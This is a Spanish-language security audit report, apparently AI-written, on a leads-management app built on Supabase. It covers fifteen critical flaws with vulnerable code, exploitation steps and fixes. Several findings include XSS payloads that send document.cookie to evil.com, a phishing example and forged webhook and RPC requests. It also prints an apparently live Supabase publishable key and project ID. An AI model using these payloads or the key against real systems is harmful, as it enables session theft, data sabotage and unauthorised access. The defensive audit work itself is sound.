# INFORME DE AUDITORÍA DE SEGURIDAD — SELLVENDE LEADS
## Análisis Completo de Todos los Riesgos Críticos

**Fecha:** 2026-04-13  
**Alcance:** 100% del código fuente (Frontend + Backend + Base de Datos)  
**Metodología:** Análisis estático línea por línea + patrones de ataque conocidos  

---

## ¿Cuántos riesgos CRÍTICOS hay exactamente?

**TOTAL: 15 hallazgos CRÍTICOS** (no 16 — corregí el conteo en esta revisión detallada).

Además hay **18 hallazgos WARNING** (graves, pero no bloquean deployment inmediato) y **16 INFO** (deuda técnica de seguridad).

Este documento cubre **solo los 15 CRÍTICOS**, cada uno con:
- Ubicación exacta (archivo + línea)
- El código vulnerable copiado textualmente
- Explicación de por qué es un riesgo
- Cómo un atacante lo explotaría
- Cómo se debe corregir

---

# HALLAZGOS CRÍTICOS (15 Total)

---

## CRÍTICO #1: GitHub Personal Access Token expuesto en texto plano

### Ubicación
**Archivo:** `c:\LeadsSellvende\.credentials\ACCESOS_SELLVENDE.md`

### El código expuesto
```
GitHub PAT: ghp_[REDACTED — token revocado]
```

### Qué es
Un GitHub Personal Access Token (PAT) clásico con prefijo `ghp_`. Este token otorga acceso completo al repositorio: clonar, pushear código, crear ramas, y potencialmente acceder a otros repos del mismo usuario.

### Cómo un atacante lo explota
1. Cualquier persona con acceso al archivo (o al historial de git si fue commiteado) puede usar este token para autenticarse en GitHub.
2. Puede hacer `git push --force` y destruir el código.
3. Puede inyectar código malicioso y hacer deploy.
4. Si el token tiene permisos en otros repos, el acceso se amplía.

### Corrección
- Revocar el token INMEDIATAMENTE en https://github.com/settings/tokens
- Eliminar el archivo o moverlo a Windows Credential Manager
- Nunca almacenar tokens en archivos de texto

---

## CRÍTICO #2: Supabase Anon Key hardcodeada en 18 commits del historial de git

### Ubicación
**Historial de git** — buscable con `git log -p`  
**Valor:** `sb_publishable_TS1zqRv0HQgmrOt_GglaRQ_0gm8jp4C`

### Qué es
La clave pública (anon) de Supabase, que estaba hardcodeada directamente en los archivos fuente en lugar de cargarse desde variables de entorno. Aunque es una clave "publicable", combinada con el Project ID (`dtloiqfkeasfcxiwlvzp`) da acceso completo a la base de datos — la ÚNICA barrera son las políticas RLS.

### Cómo un atacante lo explota
1. Con el anon key + project ID, un atacante puede conectarse directamente a Supabase con `supabase-js`.
2. Si alguna política RLS está mal configurada (y hay varias, ver CRÍTICOS #9, #10, #11), puede acceder a datos de otras agencias.
3. Puede ejecutar las RPCs `get_leads_page`, `get_leads_kpis` con cualquier `agencia_id`.

### Corrección
- Rotar la clave desde Supabase Dashboard → Settings → API
- Usar BFG Repo-Cleaner o `git filter-repo` para purgar del historial

---

## CRÍTICO #3: `fallback-secret` permite forjar tokens HMAC

### Ubicaciones (3 archivos)

**Archivo 1:** `supabase/functions/unsubscribe/index.ts`, línea 12
```typescript
const secret = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || 'fallback-secret'
```

**Archivo 2:** `supabase/functions/process-drips/index.ts`, línea 114
```typescript
const secret = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || 'fallback-secret';
```

**Archivo 3:** `supabase/functions/handle-bounce/index.ts`, línea 33-35
```typescript
if (!WEBHOOK_SECRET) {
    console.warn('[Bounce] RESEND_WEBHOOK_SECRET not set. Skipping signature check.')
    return true  // ← ¡ACEPTA cualquier petición sin verificar!
}
```

### Qué es
Si la variable de entorno `SUPABASE_SERVICE_ROLE_KEY` o `RESEND_WEBHOOK_SECRET` NO está configurada (despliegue mal configurado, entorno de desarrollo, staging), el sistema usa un secreto conocido por cualquiera que lea el código fuente: la palabra literal `'fallback-secret'`.

### Cómo un atacante lo explota

**En unsubscribe/index.ts:**
1. El atacante lee el código fuente y ve que el secreto es `'fallback-secret'`.
2. Calcula el HMAC de cualquier lead ID: `HMAC-SHA256(leadId, 'fallback-secret')`.
3. Construye la URL: `https://.../unsubscribe?id=<leadId>&token=<token_falsificado>`.
4. Puede dar de baja a CUALQUIER lead sin tener acceso al email de la víctima.

**En handle-bounce/index.ts:**
1. Sin `RESEND_WEBHOOK_SECRET`, la función acepta CUALQUIER POST.
2. El atacante envía un JSON falso: `{"data": {"to": [{"email": "competidor@ejemplo.com"}]}}`.
3. El sistema marca ese lead como `email_rebotado = true`, `estado = 'correo_falso'`.
4. Cancela TODAS las secuencias de email de ese lead.
5. Resultado: sabotaje masivo de la base de datos de leads.

**En process-drips/index.ts:**
1. Si el service role key no está configurado, los tokens de unsubscribe se firman con `'fallback-secret'`.
2. Mismo ataque que arriba.

### Corrección
En TODOS los casos, fallar en modo cerrado:
```typescript
const secret = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
if (!secret) throw new Error('SUPABASE_SERVICE_ROLE_KEY no configurada');
```

---

## CRÍTICO #4: XSS por `dangerouslySetInnerHTML` en vista previa de emails

### Ubicación
**Archivo:** `src/components/leads/modals/IndividualEmailModal.jsx`, líneas 22-30 y línea ~134

### El código vulnerable
```javascript
// LÍNEAS 22-30: Construcción del HTML sin sanitización
const previewHtml = (emailBody || '')
    .replace(/\{Nombre\}/gi, lead.nombre || 'Cliente')        // ← lead.nombre SIN sanitizar
    .replace(/\{nombre\}/gi, lead.nombre || 'Cliente')
    .replace(/\{Producto\}/gi, lead.producto_interes || 'el producto')  // ← SIN sanitizar
    .replace(/\{producto\}/gi, lead.producto_interes || 'el producto')
    // ... más reemplazos sin sanitizar

// LÍNEA ~134: Renderizado con dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: previewHtml }} />
```

### Qué es
El modal de email individual toma datos del lead (`nombre`, `producto_interes`) — que vienen del webhook de Meta y pueden ser manipulados por un atacante — y los interpola directamente en HTML que luego se renderiza con `dangerouslySetInnerHTML`. React NO escapa HTML en este caso.

### Cómo un atacante lo explota
1. Un atacante envía un formulario de Meta Lead Ad con:
   ```
   nombre: <img src=x onerror="fetch('https://evil.com/robar?cookie='+document.cookie)">
   ```
2. El lead se guarda en la base de datos con ese nombre malicioso.
3. Cuando CUALQUIER usuario abre el modal para enviar un email a ese lead, el JavaScript se ejecuta en el navegador del usuario.
4. El atacante puede robar cookies, tokens de sesión, o ejecutar cualquier acción en nombre del usuario.

### Corrección
Instalar DOMPurify (`npm install dompurify`) y sanitizar:
```javascript
import DOMPurify from 'dompurify';
const previewHtml = DOMPurify.sanitize(
    (emailBody || '')
        .replace(/\{Nombre\}/gi, DOMPurify.sanitize(lead.nombre || 'Cliente'))
        // ... etc
);
```

---

## CRÍTICO #5: XSS inyectado en emails reales enviados a clientes

### Ubicación
**Archivo:** `src/hooks/useLeadEmail.js`, líneas 20-42 (función `buildEmailContent`)

### El código vulnerable
```javascript
function buildEmailContent({ rawHtml, rawSubject, lead, config, agencyName, senderName, tplOrigen }) {
    const activeProductoName = tplOrigen || lead.producto_interes || lead.form_name || 'nuestro producto'

    const body = rawHtml
        .replace(/{nombre}/gi, lead.nombre || '')           // ← lead.nombre SIN sanitizar
        .replace(/{producto}/gi, activeProductoName)         // ← producto_interes SIN sanitizar
        .replace(/{email}/gi, fromEmail)
        .replace(/{telefono}/gi, config['telefono_agencia'] || config['whatsapp'] || '')
        .replace(/{agencia}/gi, agencyName)
        // ... más reemplazos
```

Este `body` luego se pasa a `wrapEmailTemplate()` y se envía como email real.

### Qué es
Los datos del lead (`nombre`, `producto_interes`, `form_name`) se interpolan directamente en el cuerpo del email HTML sin ninguna sanitización. La función `cleanHtmlForEmail` en `emailTemplate.js` SOLO formatea HTML (aplanar `<p>` tags, márgenes) — NO elimina `<script>`, `onerror`, `javascript:`, ni ningún vector XSS.

### Cómo un atacante lo explota
1. Un atacante envía un Meta Lead Ad con `nombre = '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">'`.
2. El sistema envía un email a ese lead (u otro destinatario si es email masivo).
3. Cuando el destinatario abre el email en Gmail/Outlook, el JavaScript se ejecuta.
4. Aunque los clientes de email modernos bloquean la mayoría de JS, algunos no lo hacen completamente, y el email puede contener iframes o redirects maliciosos.

### Corrección
Sanitizar todos los datos del lead ANTES de la interpolación:
```javascript
function escapeHtml(str) {
    return String(str || '')
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

const body = rawHtml
    .replace(/{nombre}/gi, escapeHtml(lead.nombre || ''))
    .replace(/{producto}/gi, escapeHtml(activeProductoName))
    // ... etc
```

---

## CRÍTICO #6: Cero autenticación en endpoint `send-meta-event`

### Ubicación
**Archivo:** `supabase/functions/send-meta-event/index.ts`, líneas 14-36 (toda la función)

### El código vulnerable
```typescript
// LÍNEA 15: CORS con wildcard por defecto
const ALLOWED_ORIGIN = Deno.env.get('ALLOWED_ORIGIN') || '*'   // ← '*' = CUALQUIER origen

// LÍNEA 31-36: NO hay verificación de autenticación
Deno.serve(async (req) => {
    if (req.method === 'OPTIONS') {
        return new Response('ok', { headers: corsHeaders })
    }
    try {
        const payload = await req.json()   // ← Acepta cualquier JSON
        // ... procesa y envía a Meta CAPI
```

**No existe NINGUNA verificación de:** JWT, API key, token secreto, origin IP, o cualquier forma de autenticación.

### Qué es
Esta Edge Function recibe payloads de Database Webhooks de Supabase cuando un lead cambia de estado. Envía eventos `QualifiedLead` o `Purchase` a la Meta Conversions API. Pero NO verifica quién le envía el payload. Cualquier persona en internet que conozca la URL puede llamarla.

### Cómo un atacante lo explota
1. El atacante descubre la URL: `https://dtloiqfkeasfcxiwlvzp.supabase.co/functions/v1/send-meta-event`
2. Envía un POST con un payload falso:
   ```json
   {"record": {"agencia_id": "<cualquier UUID>", "estado": "venta_cerrada", "email": "fake@test.com", "nombre": "Fake"}}
   ```
3. La función envía un evento `Purchase` falso a Meta CAPI.
4. Resultado: envenenamiento de datos de optimización de anuncios, inflación artificial de conversiones, y posiblemente costos adicionales por eventos falsos reportados a Meta.

### Corrección
Agregar un token secreto compartido:
```typescript
const WEBHOOK_SECRET = Deno.env.get('CAPI_WEBHOOK_SECRET');
const authHeader = req.headers.get('X-Webhook-Secret');
if (!authHeader || authHeader !== WEBHOOK_SECRET) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
}
```
Y configurar Supabase Database Webhooks para enviar este header.

---

## CRÍTICO #7: Cero autenticación en endpoint `meta-oauth` — robo de tokens

### Ubicación
**Archivo:** `supabase/functions/meta-oauth/index.ts`, todo el archivo

### El código vulnerable
```typescript
// No hay NINGUNA verificación de autenticación en toda la función
serve(async (req) => {
    // ... CORS, parseo de body
    const { short_lived_token, page_id } = await req.json()

    // LÍNEA 37: App Secret en URL query string (aparece en logs)
    const exchangeUrl = `https://graph.facebook.com/v19.0/oauth/access_token?
        client_id=${appId}&client_secret=${appSecret}&fb_exchange_token=${short_lived_token}`

    // LÍNEA 104: Devuelve TODOS los page access tokens al llamador
    return new Response(JSON.stringify({ pages: allPages }))
```

### Qué es
Esta función intercambia un token de corta duración de Meta por tokens de larga duración y descubre todas las páginas (Facebook Pages) que el usuario gestiona, devolviendo los access tokens de cada una. NO verifica quién la llama — cualquiera con un short-lived token puede obtener tokens de larga duración.

### Cómo un atacante lo explota
1. Un atacante obtiene el short-lived token de CUALQUIER usuario (puede estar en logs del navegador, URLs compartidas, etc.).
2. Llama a `meta-oauth` con ese token.
3. Recibe TODOS los page access tokens de larga duración para TODAS las páginas que ese usuario gestiona.
4. Con esos tokens, puede publicar en nombre de esas páginas, leer insights, modificar campañas de anuncios, etc.

### Corrección
Requerir autenticación JWT:
```typescript
const { isAuthenticated } = await verifyAuth(req);
if (!isAuthenticated) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
}
```

---

## CRÍTICO #8: Dirección "From" arbitraria permite spoofing/phishing de emails

### Ubicación
**Archivo:** `supabase/functions/resend-email/index.ts`, líneas 80-83

### El código vulnerable
```typescript
const body = await req.json()
const { from, to, subject, html, agencia_id, unsubscribe_url } = body

// ← 'from' se usa DIRECTAMENTE sin verificar que pertenezca a la agencia
// Más adelante, línea ~140-157:
// Gmail:
await transporter.sendMail({ from, to, subject, html, ... })
// Resend:
await fetch('https://api.resend.com/emails', {
    body: JSON.stringify({ from, to, subject, html, ... })
})
```

### Qué es
El campo `from` del email viene directamente del cuerpo de la petición HTTP. La función verifica que el usuario pertenezca a la agencia (IDOR check), pero NO verifica que la dirección `from` sea la dirección configurada para esa agencia en la tabla `configuracion`.

### Cómo un atacante lo explota
1. Un usuario autenticado de la Agencia A llama a `resend-email` con:
   ```json
   {
       "from": "CEO <ceo@sellvende.com>",
       "to": ["empleado@empresa.com"],
       "subject": "Urgente: cambia tu contraseña",
       "html": "<p>Haz clic aquí: https://evil.com/phishing</p>",
       "agencia_id": "<id de Agencia A>"
   }
   ```
2. El email se envía DESDE `ceo@sellvende.com` a través del SMTP/Resend de la agencia.
3. Resultado: phishing profesional usando identidades falsas.

### Corrección
Validar que `from` coincida con la configuración de la agencia:
```typescript
const configEmail = configMap['email_remitente'];
if (!from.includes(configEmail)) {
    return new Response(JSON.stringify({ error: 'Dirección from no permitida' }), { status: 403 });
}
```

---

## CRÍTICO #9: SECURITY DEFINER RPCs confían en `p_agencia_id` del llamador — fuga de datos entre tenants

### Ubicaciones (2 archivos de migración)

**Archivo 1:** `supabase/migrations/20260411120000_fix_rpcs_estado_rebranding.sql`
```sql
-- get_leads_kpis: SECURITY DEFINER (se ejecuta como el creador, NO como el usuario)
CREATE OR REPLACE FUNCTION get_leads_kpis(p_agencia_id UUID)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER    -- ← Se ejecuta con privilegios elevados
AS $$
    -- ... filtra por p_agencia_id que el USUARIO proporcionó
    FROM leads WHERE agencia_id = p_agencia_id;
$$;
GRANT EXECUTE ON FUNCTION get_leads_kpis TO authenticated, service_role;
```

**Archivo 2:** `supabase/migrations/20260411120000_fix_rpcs_estado_rebranding.sql` (misma migración)
```sql
-- get_leads_page: SECURITY DEFINER
CREATE OR REPLACE FUNCTION get_leads_page(p_agencia_id UUID, ...)
RETURNS TABLE(...)
LANGUAGE plpgsql
SECURITY DEFINER    -- ← Se ejecuta con privilegios elevados
AS $$
    FROM leads l WHERE l.agencia_id = p_agencia_id  -- ← Confía ciegamente en el parámetro
$$;
GRANT EXECUTE ON FUNCTION get_leads_page TO authenticated, service_role;
```

### Qué es
`SECURITY DEFINER` significa que la función se ejecuta con los privilegios de quien la creó (normalmente el dueño de la base de datos), NO con los privilegios del usuario que la llama. Estas funciones reciben `p_agencia_id` como parámetro y confían ciegamente en ese valor para filtrar datos.

### Cómo un atacante lo explota
1. Usuario de Agencia A obtiene el UUID de Agencia B (puede adivinarlo, encontrarlo en un error, o enumerarlo).
2. Llama a la RPC: `supabase.rpc('get_leads_page', { p_agencia_id: 'uuid-de-agencia-b' })`
3. La función se ejecuta como administrador y devuelve TODOS los leads de Agencia B: nombres, emails, teléfonos, notas.
4. Lo mismo con `get_leads_kpis` — obtiene métricas completas de cualquier agencia.
5. **Bypass TOTAL del aislamiento multi-tenant.**

### Corrección
Dentro de cada función SECURITY DEFINER, resolver la agencia del usuario REAL usando `auth.uid()`:
```sql
CREATE OR REPLACE FUNCTION get_leads_kpis(p_agencia_id UUID)
RETURNS JSON LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_real_agencia_id UUID;
BEGIN
    -- Obtener la agencia REAL del usuario llamante
    SELECT agencia_id INTO v_real_agencia_id
    FROM usuarios_agencia WHERE usuario_id = auth.uid() LIMIT 1;

    -- IGNORAR el p_agencia_id del llamador, usar el real
    SELECT json_build_object(...)
    INTO result
    FROM leads WHERE agencia_id = v_real_agencia_id;  -- ← No p_agencia_id
    RETURN result;
END;
$$;
```

---

## CRÍTICO #10: `mass_enroll_sequence` ejecutable por usuarios NO autenticados (anon)

### Ubicación
**Archivo:** `supabase/migrations/20260413000000_fix_mass_enroll_sequence.sql`, última línea

### El código vulnerable
```sql
CREATE OR REPLACE FUNCTION mass_enroll_sequence(p_lead_ids UUID[], p_sequence_id UUID)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER    -- ← Se ejecuta como administrador
AS $bd$
    -- ...
    DELETE FROM leads_secuencias WHERE lead_id = ANY(p_lead_ids);  -- ← Borra secuencias
    -- ...
    INSERT INTO leads_secuencias (...);  -- ← Inserta nuevas
$bd$;

-- ¡ÚLTIMA LÍNEA!
GRANT EXECUTE ON FUNCTION mass_enroll_sequence(UUID[], UUID) TO anon, authenticated, service_role;
--                                                          ^^^^^^
--                                                 ¡USUARIOS NO AUTENTICADOS!
```

### Qué es
La función `mass_enroll_sequence`:
1. Es `SECURITY DEFINER` (se ejecuta como administrador de BD).
2. Borra TODAS las secuencias activas de los leads dados (`DELETE FROM leads_secuencias`).
3. Inserta nuevas secuencias.
4. Está otorgada a `anon` — significa que **cualquier persona en internet, sin autenticarse**, puede ejecutarla.

### Cómo un atacante lo explota
1. El atacante envía una petición POST al endpoint RPC de Supabase:
   ```
   POST /rest/v1/rpc/mass_enroll_sequence
   {"p_lead_ids": ["<uuid1>", "<uuid2>", ...], "p_sequence_id": "<cualquier secuencia>"}
   ```
2. NO necesita autenticarse (otorgado a `anon`).
3. La función se ejecuta como administrador y borra las secuencias de TODOS los leads especificados.
4. Resultado: sabotaje masivo del motor de drip para CUALQUIER lead en CUALQUIER agencia.

### Corrección
Eliminar `anon` del GRANT:
```sql
GRANT EXECUTE ON FUNCTION mass_enroll_sequence(UUID[], UUID) TO authenticated, service_role;
```

---

## CRÍTICO #11: Políticas RLS de `email_queue` comparan `agencia_id` con `auth.uid()` — siempre falso

### Ubicación
**Archivo:** `supabase/migrations/20260413010000_email_queue_arch.sql`, líneas 30-38

### El código vulnerable
```sql
-- Política SELECT
CREATE POLICY "Agencias pueden ver su propia cola"
    ON public.email_queue FOR SELECT
    USING (agencia_id = auth.uid());   -- ← agencia_id es UUID de AGENCIA, auth.uid() es UUID de USUARIO

-- Política INSERT
CREATE POLICY "Agencias pueden agregar a su cola"
    ON public.email_queue FOR INSERT
    WITH CHECK (agencia_id = auth.uid());   -- ← SIEMPRE FALSO

-- Política DELETE
CREATE POLICY "Agencias pueden limpiar su cola"
    ON public.email_queue FOR DELETE
    USING (agencia_id = auth.uid());   -- ← SIEMPRE FALSO
```

### Qué es
`agencia_id` es un UUID que referencia la tabla `agencias` (ej: `a1b2c3d4-...`).
`auth.uid()` es el UUID del usuario autenticado en Supabase Auth (ej: `e5f6g7h8-...`).

Estos DOS UUIDs son **siempre diferentes**. La comparación `agencia_id = auth.uid()` SIEMPRE devuelve `false`.

**Consecuencia:** Las políticas RLS deniegan TODAS las operaciones al frontend. El usuario autenticado NUNCA puede leer, escribir ni borrar de `email_queue` desde el frontend. El Edge Function `process-queue` funciona porque usa `service_role` que bypassa RLS.

### Impacto
- Si el frontend intenta leer la cola de emails directamente, recibe 0 filas.
- Si el frontend intenta insertar en la cola directamente, la inserción es rechazada.
- Toda la funcionalidad de cola de emails depende exclusivamente del Edge Function.

### Corrección
```sql
CREATE POLICY "Agencias pueden ver su propia cola"
    ON public.email_queue FOR SELECT
    USING (agencia_id IN (
        SELECT agencia_id FROM usuarios_agencia WHERE usuario_id = auth.uid()
    ));
```

---

## CRÍTICO #12: Tokens de acceso a Meta en URLs query string (exposición en logs)

### Ubicaciones (3 archivos)

**Archivo 1:** `supabase/functions/meta-webhook/index.ts`, línea ~160
```typescript
const graphUrl = `https://graph.facebook.com/v19.0/${leadgenId}?fields=...&access_token=${accessToken}`
```

**Archivo 2:** `supabase/functions/sync-leads/index.ts`, línea ~67
```typescript
`https://graph.facebook.com/v19.0/${pageId}/leadgen_forms?fields=id,name&access_token=${metaToken}`
```

**Archivo 3:** `supabase/functions/meta-oauth/index.ts`, línea 37
```typescript
const exchangeUrl = `https://graph.facebook.com/v19.0/oauth/access_token?
    client_id=${appId}&client_secret=${appSecret}&fb_exchange_token=${short_lived_token}`
```

### Qué es
Los tokens de acceso a Meta (page access tokens, app secrets, short-lived tokens) se envían como parámetros de URL query string. Los query strings quedan registrados en:
- Logs del servidor de Deno Edge Functions
- Logs de cualquier proxy HTTP intermedio
- Logs del DNS resolver
- Logs del servidor de Meta

### Cómo un atacante lo explota
1. Si los logs de Deno son accesibles (por error de configuración, debug habilitado), los tokens son visibles.
2. Si hay un proxy corporativo o CDN entre el Edge Function y Meta, los tokens quedan en sus logs.
3. Con un page access token robado, el atacante puede leer/escribir en esa Facebook Page.
4. Con el app secret, puede impersonar la aplicación completa.

### Corrección
Usar headers `Authorization: Bearer` en lugar de query params:
```typescript
const metaResponse = await fetch(`https://graph.facebook.com/v19.0/${leadgenId}?fields=...`, {
    headers: { 'Authorization': `Bearer ${accessToken}` }
});
```

---

## CRÍTICO #13: Datos de Meta Graph API SIN sanitizar inyectados en emails HTML

### Ubicación
**Archivo:** `supabase/functions/meta-webhook/index.ts`, función `sendNewLeadAlert()` (~líneas 265-340)

### El código vulnerable
```typescript
// Los valores de campaign_name, adset_name, utm_campaign, utm_source, utm_medium
// vienen DIRECTAMENTE de Meta Graph API SIN sanitización
const emailBody = `
    <h2>Nuevo Lead Capturado</h2>
    <table>
        <tr><td>Nombre:</td><td>${lead.nombre}</td></tr>
        <tr><td>Email:</td><td>${lead.email}</td></tr>
        <tr><td>Teléfono:</td><td>${lead.telefono}</td></tr>
        <tr><td>Origen:</td><td>${lead.origen}</td></tr>
        <tr><td>Campaña:</td><td>${lead.campaign_name}</td></tr>     // ← SIN escapeHtml
        <tr><td>Adset:</td><td>${lead.adset_name}</td></tr>          // ← SIN escapeHtml
        <tr><td>UTM Source:</td><td>${lead.utm_source}</td></tr>    // ← SIN escapeHtml
        <tr><td>UTM Campaign:</td><td>${lead.utms_campaign}</td></tr> // ← SIN escapeHtml
    </table>
`;
```

### Qué es
La función `sendNewLeadAlert()` envía un email de notificación al admin de la agencia cuando llega un nuevo lead. Interpola datos del lead directamente en HTML. Aunque `nombre`, `email`, y `telefono` pasan por `sanitizeInput()`, los campos `campaign_name`, `adset_name`, `utm_source`, `utm_medium`, `utm_campaign` vienen directamente de la Meta Graph API sin ninguna sanitización.

### Cómo un atacante lo explota
1. Un atacante crea una campaña de Meta Ads con:
   - `utm_campaign = "<img src=x onerror='fetch(\"https://evil.com/admin-cookie?c=\"+document.cookie)'>"`
2. Cuando alguien llena el formulario de esa campaña, el webhook llama a `sendNewLeadAlert()`.
3. El email de notificación al admin contiene el script malicioso.
4. Si el admin abre el email en un cliente que renderiza HTML con JS, el script se ejecuta.

### Corrección
Aplicar `escapeHtml()` a TODOS los valores interpolados:
```typescript
<tr><td>Campaña:</td><td>${escapeHtml(lead.campaign_name)}</td></tr>
<tr><td>Adset:</td><td>${escapeHtml(lead.adset_name)}</td></tr>
```

---

## CRÍTICO #14: Procesamiento de cola NO atómico — emails duplicados

### Ubicación
**Archivo:** `supabase/functions/process-queue/index.ts`, líneas 33-50

### El código vulnerable
```typescript
// PASO 1: SELECT de items pendientes (LÍNEA 39-44)
const { data: queueItems, error: fetchErr } = await supabaseClient
    .from('email_queue')
    .select('*')
    .eq('estado', 'pendiente')
    .order('created_at', { ascending: true })
    .limit(50)

// PASO 2: UPDATE separado para marcarlos como procesando (LÍNEA 50)
const queueIds = queueItems.map(q => q.id)
await supabaseClient.from('email_queue').update({ estado: 'procesando' }).in('id', queueIds)
```

### Qué es
El procesamiento de la cola de emails usa DOS operaciones separadas: primero hace SELECT de los pendientes, luego hace UPDATE para marcarlos como procesando. Entre estas dos operaciones hay un gap de tiempo donde otro worker (cron manual o automático) puede hacer el mismo SELECT y obtener LOS MISMOS items.

### Cómo un atacante lo explota
No es un ataque intencional, pero es una condición de carrera que causa:
1. Cron automático se ejecuta a las 12:00:00 — hace SELECT de 50 pendientes.
2. Cron manual se ejecuta a las 12:00:01 — hace SELECT de los MISMO 50 pendientes (todavía no están marcados como procesando).
3. Ambos workers envían los MISMOS 50 emails.
4. Resultado: 50 leads reciben el mismo email DOS veces.

### Corrección
Usar una operación atómica UPDATE ... RETURNING:
```sql
-- Crear un RPC que haga UPDATE y devuelva las filas actualizadas
CREATE OR REPLACE FUNCTION grab_queue_items(p_limit INT, p_agencia_limit INT)
RETURNS SETOF email_queue
LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    RETURN QUERY
    UPDATE email_queue
    SET estado = 'procesando'
    WHERE id IN (
        SELECT id FROM email_queue
        WHERE estado = 'pendiente'
        ORDER BY created_at ASC
        LIMIT p_limit
    )
    RETURNING *;
END;
$$;
```

---

## CRÍTICO #15: `handle-bounce` acepta falsos bounces sin secret

### Ubicación
**Archivo:** `supabase/functions/handle-bounce/index.ts`, líneas 30-36

### El código vulnerable
```typescript
async function verifyWebhookSignature(req: Request, rawBody: string): Promise<boolean> {
    if (!WEBHOOK_SECRET) {
        // No secret configured — warn but allow in dev mode
        console.warn('[Bounce] RESEND_WEBHOOK_SECRET not set. Skipping signature check.')
        return true   // ← ¡ACEPTA CUALQUIER PETICIÓN!
    }
    // ... verificación HMAC normal si hay secret
```

### Qué es
Si la variable de entorno `RESEND_WEBHOOK_SECRET` no está configurada (común en entornos de desarrollo, staging, o despliegues mal configurados), la función simplemente acepta CUALQUIER petición POST como un bounce legítimo.

### Cómo un atacante lo explota
1. El atacante descubre la URL del webhook: `https://.../functions/v1/handle-bounce`
2. Envía un POST con JSON:
   ```json
   {"data": {"to": [{"email": "ceo@empresa-competencia.com"}], "bounce": {"type": "hard"}}}
   ```
3. La función, sin verificar firma, marca ese email como rebotado.
4. El lead `ceo@empresa-competencia.com` queda marcado como `email_rebotado = true`, `estado = 'correo_falso'`.
5. TODAS sus secuencias de email son canceladas.
6. Resultado: sabotaje selectivo de leads de la competencia.

### Corrección
Fallar en modo cerrado:
```typescript
if (!WEBHOOK_SECRET) {
    console.error('[Bounce] RESEND_WEBHOOK_SECRET not set. Rejecting request.');
    return false;  // ← RECHAZAR si no hay secret
}
```

---

# RESUMEN EJECUTIVO

## Los 15 CRÍTICOS agrupados por tipo

| # | Tipo | Archivo | Riesgo Principal |
|---|------|---------|-----------------|
| 1 | **Secretos expuestos** | `.credentials/ACCESOS_SELLVENDE.md` | Token GitHub completo |
| 2 | **Secretos en historial** | 18 commits de git | Anon key de Supabase |
| 3 | **Config insegura** | 3 Edge Functions | `fallback-secret` forjable |
| 4 | **XSS Frontend** | `IndividualEmailModal.jsx` | JS ejecuta en navegador del admin |
| 5 | **XSS en emails** | `useLeadEmail.js` | JS inyectado en emails reales |
| 6 | **Sin auth** | `send-meta-event/index.ts` | Cualquiera envía eventos falsos a Meta |
| 7 | **Sin auth** | `meta-oauth/index.ts` | Robo de tokens de Facebook Pages |
| 8 | **Spoofing** | `resend-email/index.ts` | Emails desde cualquier dirección |
| 9 | **Bypass multi-tenant** | RPC migrations | Leer datos de CUALQUIER agencia |
| 10 | **Sin auth + destructivo** | `mass_enroll_sequence` | Borrar secuencias sin autenticarse |
| 11 | **RLS rota** | `email_queue_arch.sql` | Frontend no puede usar su propia cola |
| 12 | **Tokens en logs** | 3 Edge Functions | Tokens de Meta expuestos en logs |
| 13 | **XSS en email admin** | `meta-webhook/index.ts` | Script en notificaciones al admin |
| 14 | **Race condition** | `process-queue/index.ts` | Emails duplicados a leads |
| 15 | **Fail abierto** | `handle-bounce/index.ts` | Falsos bounces aceptados |

## Severidad relativa (orden de peligro)

**PELIGRO INMEDIATO (actuar hoy):**
1. **#1** — Revocar GitHub PAT (5 minutos)
2. **#10** — Quitar `anon` de `mass_enroll_sequence` (5 minutos)
3. **#6** — Agregar auth a `send-meta-event` (30 minutos)
4. **#7** — Agregar auth a `meta-oauth` (30 minutos)
5. **#3** — Eliminar `fallback-secret` de 3 funciones (15 minutos)
6. **#15** — Fallar cerrado en `handle-bounce` (5 minutos)

**PELIGRO ALTO (esta semana):**
7. **#9** — Fix SECURITY DEFINER RPCs (1-2 horas)
8. **#4, #5, #13** — Instalar DOMPurify, sanitizar HTML (2-3 horas)
9. **#8** — Validar `from` en resend-email (15 minutos)
10. **#12** — Mover tokens a Authorization headers (45 minutos)
11. **#11** — Fix RLS policies de email_queue (15 minutos)
12. **#14** — Queue processing atómico (30 minutos)

**PELIGRO MEDIO (próximo sprint):**
13. **#2** — Rotar anon key + limpiar historial git (1 hora)

---

## ¿Son solo estos 15?

**Sí, estos son los 15 únicos hallazgos CRÍTICOS** que bloquean deployment. Pero además existen:

- **18 hallazgos WARNING** — Graves pero no impiden deployment inmediato (ej: advisory lock fails open, poison pill counter in-memory, iframe sandbox permisivo, header injection CRLF, etc.)
- **16 hallazgos INFO** — Deuda técnica de seguridad (ej: lock key hardcoded en fuente, CORS wildcard, console.log en producción, etc.)
- **12 bugs de lógica** — No son de seguridad pero causan mal funcionamiento (ej: handleSave queda cargando para siempre, descuentos no se aplican, secuencias colapsan, etc.)

Si quieres el informe completo de los WARNING, INFO y bugs de lógica, puedo generarlo como documento separado.

---

**FIN DEL INFORME**
